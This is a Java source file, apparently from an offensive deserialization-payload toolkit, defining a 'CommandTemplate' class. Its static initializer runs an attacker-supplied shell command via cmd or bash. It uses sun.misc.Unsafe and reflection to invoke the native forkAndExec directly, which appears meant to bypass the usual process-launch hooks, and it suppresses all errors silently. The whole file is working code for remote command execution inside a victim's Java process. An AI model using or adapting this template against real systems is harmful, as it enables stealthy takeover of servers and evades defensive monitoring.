package org.su18.ysuserial.payloads.templates;

import sun.misc.Unsafe;

import java.lang.reflect.Field;
import java.lang.reflect.Method;

/**
 * 命令执行 Template
 *
 * @author su18
 */
public class CommandTemplate {

    static String cmd;

    static {
        try {
            String[] cmds = new String[3];

            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                cmds[0] = "cmd";
                cmds[1] = "/c";
            } else {
                cmds[0] = "bash";
                cmds[1] = "-c";
            }
            cmds[2] = cmd;

            // 使用 Unsafe 创建 UNIXProcess/ProcessImpl 实例
            Field theUnsafeField = Unsafe.class.getDeclaredField("theUnsafe");
            theUnsafeField.setAccessible(true);
            Unsafe unsafe = (Unsafe) theUnsafeField.get(null);

            Class processClass = null;

            try {
                processClass = Class.forName("java.lang.UNIXProcess");
            } catch (ClassNotFoundException e) {
                processClass = Class.forName("java.lang.ProcessImpl");
            }

            Object processObject = unsafe.allocateInstance(processClass);

            byte[][] args = new byte[cmds.length - 1][];
            int      size = args.length; // For added NUL bytes

            for (int i = 0; i < args.length; i++) {
                args[i] = cmds[i + 1].getBytes();
                size += args[i].length;
            }

            byte[] argBlock = new byte[size];
            int    i        = 0;

            for (byte[] arg : args) {
                System.arraycopy(arg, 0, argBlock, i, arg.length);
                i += arg.length + 1;
            }

            int[] envc                 = new int[1];
            int[] std_fds              = new int[]{-1, -1, -1};
            Field launchMechanismField = processClass.getDeclaredField("launchMechanism");
            Field helperpathField      = processClass.getDeclaredField("helperpath");
            launchMechanismField.setAccessible(true);
            helperpathField.setAccessible(true);
            Object launchMechanismObject = launchMechanismField.get(processObject);
            byte[] helperpathObject      = (byte[]) helperpathField.get(processObject);

            int ordinal = (int) launchMechanismObject.getClass().getMethod("ordinal").invoke(launchMechanismObject);

            Method forkMethod = processClass.getDeclaredMethod("forkAndExec", new Class[]{
                int.class, byte[].class, byte[].class, byte[].class, int.class,
                byte[].class, int.class, byte[].class, int[].class, boolean.class
            });

            forkMethod.setAccessible(true);

            byte[] bytes  = cmds[0].getBytes();
            byte[] result = new byte[bytes.length + 1];
            System.arraycopy(bytes, 0, result, 0, bytes.length);
            result[result.length - 1] = (byte) 0;

            // 执行系统命令
            forkMethod.invoke(processObject, ordinal + 1, helperpathObject, result, argBlock, args.length,
                null, envc[0], null, std_fds, false);

        } catch (Exception ignored) {
        }
    }
}
